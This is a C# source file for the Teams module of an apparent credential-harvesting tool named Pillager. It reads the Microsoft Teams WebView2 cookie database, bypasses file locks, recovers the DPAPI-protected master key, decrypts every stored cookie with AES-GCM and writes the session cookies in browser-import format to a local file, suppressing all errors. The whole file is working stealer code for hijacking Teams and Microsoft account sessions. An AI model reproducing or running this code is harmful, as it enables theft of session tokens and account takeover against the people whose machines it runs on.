using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Pillager.Messengers
{
    internal class Teams : ICommand
    {
        public string cookies()
        {
            StringBuilder cookies = new StringBuilder();
            string cookie_path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Packages\\MicrosoftTeams_8wekyb3d8bbwe\\LocalCache\\Microsoft\\MSTeams\\EBWebView\\Default\\Network\\Cookies");
            if (!File.Exists(cookie_path))
                return "";
            try
            {
                string cookie_tempFile = Path.GetTempFileName();
                try
                {
                    File.Copy(cookie_path, cookie_tempFile, true);
                }
                catch
                {
                    byte[] ckfile = LockedFile.ReadLockedFile(cookie_path);
                    if (ckfile != null)
                    {
                        File.WriteAllBytes(cookie_tempFile, ckfile);
                    }
                }
                SQLiteHandler handler = new SQLiteHandler(cookie_tempFile);
                if (!handler.ReadTable("cookies"))
                    return "";
                for (int i = 0; i < handler.GetRowCount(); i++)
                {
                    try
                    {
                        string host_key = handler.GetValue(i, "host_key");
                        string name = handler.GetValue(i, "name");
                        string crypt = handler.GetValue(i, "encrypted_value");
                        string path = handler.GetValue(i, "path");
                        double expDateDouble = 0;
                        long.TryParse(handler.GetValue(i, "expires_utc"), out var expDate);
                        if ((expDate / 1000000.000000000000) - 11644473600 > 0)
                            expDateDouble = (expDate / 1000000.000000000000000) - 11644473600;
                        string cookie = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));
                        cookies.AppendLine("{");
                        cookies.AppendLine("    \"domain\": \"" + host_key + "\",");
                        cookies.AppendLine("    \"expirationDate\": " + expDateDouble + ",");
                        cookies.AppendLine("    \"hostOnly\": false,");
                        cookies.AppendLine("    \"name\": \"" + name + "\",");
                        cookies.AppendLine("    \"path\": \"" + path + "\",");
                        cookies.AppendLine("    \"session\": true,");
                        cookies.AppendLine("    \"storeId\": null,");
                        cookies.AppendLine("    \"value\": \"" + cookie.Replace("\"", "\\\"") + "\"");
                        cookies.AppendLine("},");
                    }
                    catch { }
                }
                File.Delete(cookie_tempFile);
            }
            catch { }
            if (cookies.Length > 0)
            {
                string temp = cookies.ToString();
                return "[" + temp.Substring(0, temp.Length - 3) + "]";
            }
            return cookies.ToString();
        }

        public byte[] GetMasterKey()
        {
            string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Packages\\MicrosoftTeams_8wekyb3d8bbwe\\LocalCache\\Microsoft\\MSTeams\\EBWebView\\Local State");
            byte[] masterKey = new byte[] { };
            if (!File.Exists(filePath))
                return null;
            var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath).Replace(" ", ""));
            foreach (System.Text.RegularExpressions.Match prof in pattern)
            {
                if (prof.Success)
                    masterKey = Convert.FromBase64String((prof.Groups[1].Value));
            }
            byte[] temp = new byte[masterKey.Length - 5];
            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);
            try
            {
                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
            }
            catch
            {
                return null;
            }
        }

        private byte[] DecryptData(byte[] buffer)
        {
            byte[] decryptedData = null;
            byte[] MasterKey = GetMasterKey();
            if (MasterKey is null) return null;
            try
            {
                string bufferString = Encoding.UTF8.GetString(buffer);
                if (bufferString.StartsWith("v10") || bufferString.StartsWith("v11"))
                {
                    byte[] iv = new byte[12];
                    Array.Copy(buffer, 3, iv, 0, 12);
                    byte[] cipherText = new byte[buffer.Length - 15];
                    Array.Copy(buffer, 15, cipherText, 0, buffer.Length - 15);
                    byte[] tag = new byte[16];
                    Array.Copy(cipherText, cipherText.Length - 16, tag, 0, 16);
                    byte[] data = new byte[cipherText.Length - tag.Length];
                    Array.Copy(cipherText, 0, data, 0, cipherText.Length - tag.Length);
                    decryptedData = new AesGcm().Decrypt(MasterKey, iv, null, data, tag);
                }
                else
                {
                    decryptedData = ProtectedData.Unprotect(buffer, null, DataProtectionScope.CurrentUser);
                }
            }
            catch { }
            return decryptedData;
        }

        public override void Save(string path)
        {
            try
            {
                string result = cookies();
                if (string.IsNullOrEmpty(result)) return;
                string savepath = Path.Combine(path, "Teams");
                Directory.CreateDirectory(savepath);
                File.WriteAllText(Path.Combine(savepath, "Teams.txt"), result, Encoding.UTF8);
            }
            catch { }
        }
    }
}
